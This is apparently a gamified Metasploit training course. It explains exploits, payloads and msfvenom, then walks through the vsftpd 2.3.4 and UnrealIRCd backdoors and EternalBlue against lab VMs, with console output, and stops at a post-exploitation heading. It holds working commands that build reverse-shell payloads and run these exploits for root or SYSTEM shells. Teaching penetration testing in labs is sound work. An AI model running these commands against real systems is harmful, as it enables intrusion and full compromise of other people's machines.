    TM-2600-MSF §1

    Level 1 — Zero: Concepts, Ethics & First Launch

    CLEARANCE: SCOUTOBJECTIVE: UNDERSTAND THE MACHINE

    1.1 What "exploitation" actually means

    A vulnerability is a flaw (bad input handling, missing check, backdoored build). An exploit is a program that drives that flaw to divert execution — classically by overwriting a return address, injecting a command, or abusing logic. The payload is what runs after the diversion: a shell, a Meterpreter agent, a command. The framework's genius: exploit and payload are separate modules that snap together.

    ◉ ANIMATED: VULN → EXPLOIT → PAYLOAD → SESSION
    🖥️
    TARGET APPflawed service
    malformed input⚡
    💉
    EXPLOIThijacks flow
    payload⚡
    🎛️
    HANDLERsession 1 opened
    Blue = exploit traffic · Gold = payload delivery · Watch packets travel attacker → victim → session.

    1.2 Under the hood: directories & language

    Written in Ruby. Source tree separates modules/ (the 7 module families), lib/ (core: Rex sockets, Msf::Exploit, session handling), data/ (shellcode, wordlists), plugins/, scripts/, optional PostgreSQL DB for hosts/services/vulns. Console = msfconsole; generator = msfvenom.

    1.3 Install (Kali — attacker VM)

    # Kali already ships it. Init DB once, then launch:
sudo msfdb init
msfconsole -q
msf6 > db_status      # should say: connected to msf
msf6 > version        # e.g. Framework: 6.3.x
msf6 > help           # search | use | show options | set | run | sessions

    1.4 Your first safe run: try the terminal

    Press Run demo — a scripted msfconsole boot. Then type help, search vsftpd or version in the box and hit Enter.

    Level 3 — Payloads: Shells, Meterpreter & msfvenom

    CLEARANCE: EXPLOITEROBJECTIVE: CHOOSE THE RIGHT WARHEAD

    3.1 Reading a payload name

    windows/x64/meterpreter/reverse_tcp = platform / arch / kind / transport. Slashes (/) mean staged (stager + stage); underscores (meterpreter_reverse_tcp) mean stageless (one blob).

    AxisOption AOption BRule of thumb
    SizeStaged — tiny stager phones home, pulls big stageStageless — all-in-one, biggerTiny buffer → staged; roomy → stageless (fewer round-trips, more robust)
    DirectionBind — victim listens, you connect inReverse — you listen, victim calls backFirewalled victim inbound → reverse; you can't receive → bind
    Kindshell — raw cmd.exe / /bin/shMeterpreter — in-memory agent: migrate, hashdump, upload/download, pivotLearn Meterpreter; fall back to shell when stealth/size demands
    ◉ ANIMATED: BIND vs REVERSE — CLICK TO SWITCH
    🐉
    KALI (you)LISTENER :4444
    kali◀ victim calls backvictim
    🖥️
    VICTIMconnects out
    REVERSE: LHOST=your Kali IP, multi/handler listens. Victim egress usually allowed → most reliable in labs.
    ◉ ANIMATED: STAGED (2 TRIPS) vs STAGELESS (1 TRIP)
    🐉
    KALIhandler
    trip 1: 300-byte stager→
    🖥️
    VICTIMreceives…
    trip 2: full Meterpreter stage→
    📦
    STAGELESSsingle 800KB blob, no trip 2
    Small gold dot = stager · Big green block = stage. Stageless skips trip 2 but needs a bigger initial hole.

    3.2 Meterpreter: the agent, not the exploit

    Client (DLL) lives in memory on the victim; Ruby server in the framework drives it. Core + extensions: sysinfo · getuid · ps · migrate · hashdump · upload/download · shell · portfwd/route. Dies with the process unless you migrate.

    3.3 msfvenom — build standalone payloads

    # list payloads / formats / encoders
msfvenom -l payloads | grep -i meterpreter
msfvenom -l formats   # exe, elf, raw, war, aspx, ps1…
# Linux stageless reverse shell (lab only):
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf -o /tmp/lab.elf
# Windows staged reverse over TCP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /tmp/lab.exe
# catch it with:  use exploit/multi/handler; set PAYLOAD <same>; set LHOST …; run
    ⚠ ENCODER MYTH -e x86/shikata_ga_nai -i 3 dodges bad characters, not modern AV/EDR. Treat encoding as a size/format tool, never as "FUD".

    Level 4 — The Exploitation Workflow (The Six Moves)

    CLEARANCE: CONTROLLEROBJECTIVE: RUN CLEAN KILL-CHAINS

    4.1 The loop professionals never skip

    ◉ ANIMATED: SEARCH → USE → SHOW → SET → CHECK → RUN → SESSIONS
    S
    search type:exploit smb — find candidates, read Rank + DisclosureDate.
    U
    use exploit/… + info — read description, references (CVE), side effects.
    O
    show options / show targets / show payloads — learn required RHOSTS LHOST.
    C
    check — ask "are you vulnerable?" when supported. Scanner-first for EternalBlue!
    R
    run (or exploit -z) — fire. Snapshot first; Manual rank may crash target.
    ↔
    sessions -l · sessions -i 1 · background · sessions -k — manage shells.
    Golden rule: scan with auxiliary → verify with check → only then exploit a disposable snapshot.

    Level 5 — Real Exploits, Dissected

    CLEARANCE: ARCHITECTOBJECTIVE: UNDERSTAND THREE CLASSICS
    ⚠ LAB ONLY All three targets below are deliberately vulnerable lab VMs (Metasploitable 2 / disposable unpatched Windows). Never replay against real hosts.

    5.1 Case A — vsftpd 2.3.4 backdoor · CVE-2011-2523 EASIESTLINUX

    The distributed source archive of vsftpd 2.3.4 was trojaned: any username ending in :) triggered a bind shell on TCP/6200. Not a bug in clean builds — a backdoored tarball. Metasploitable 2 ships the tainted version on port 21.

    msf6 > search vsftpd   # → exploit/unix/ftp/vsftpd_234_backdoor
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info   # read: backdoor, port 6200, CVE-2011-2523
msf6 exploit(…) > set RHOSTS 192.168.56.20 show options run
[*] 192.168.56.20:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.20:21 - USER: 331 Please specify the password.
[+] 192.168.56.20:6200 - Backdoor service has been spawned, handling…
[+] Found shell.  → whoami → root
    ◉ ANIMATED: BACKDOOR TRIGGER (port 21 → shell on 6200)
    🐉
    KALIUSER evil:)
    :21 trigger→
    🐧
    vsftpd 2.3.4tainted build
    :6200 shell→
    💀
    ROOT SHELLuid=0
    Smiley :) in USER = secret knock. Lesson: verify software supply chain, not just banners.

    5.2 Case B — UnrealIRCd 3.2.8.1 backdoor · CVE-2010-2075 EASYLINUX · IRC 6667

    Same pattern: the download mirror for UnrealIRCd 3.2.8.1 was trojaned for months. Sending AB; command after connect executes shell as the IRC user. Metasploitable 2 runs it on 6667.

    msf6 > search unrealircd  # → exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(…) > set RHOSTS 192.168.56.20 set PAYLOAD cmd/unix/reverse
msf6 exploit(…) > set LHOST 192.168.56.10 run
[*] Connected to 192.168.56.20:6667… [*] Sending backdoor command…
[+] Command shell session 1 opened

    5.3 Case C — EternalBlue · MS17-010 (CVE-2017-0144) DANGEROUSWINDOWS SMB

    Microsoft bulletin MS17-010 patched SMBv1 RCE: crafted messages overflow the server kernel pool → remote code as SYSTEM. The leaked EternalBlue technique weaponized it (WannaCry, 2017). Metasploit ships both a safe auxiliary/scanner/smb/smb_ms17_010 (checks patch + DoublePulsar) and exploit/windows/smb/ms17_010_eternalblue (many Windows 7 / Server 2008 targets — can BSOD; disposable snapshot mandatory).

    ◉ ANIMATED: ETERNALBLUE — SCAN FIRST, THEN (OPTIONAL) EXPLOIT
    ✓
    auxiliary/scanner/smb/smb_ms17_010 → "Host is likely VULNERABLE to MS17-010!" or "Patched". Stop here if patched.
    !
    Snapshot VM → use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS/LHOST/PAYLOAD → check → run → meterpreter > sysinfo shows NT AUTHORITY\SYSTEM.
    Patched Win10 = not vulnerable. Verify build + SMBv1 + patch state; module targets vary by Framework version — trust local search.

    Level 7 — Post-Exploitation: Meterpreter, Pivoting & Loot

    CLEARANCE: HERO (FINAL)OBJECTIVE: FINISH THE MISSION CLEANLY

    7.1 You have a session. Now what?

    GoalMeterpreter / post moves
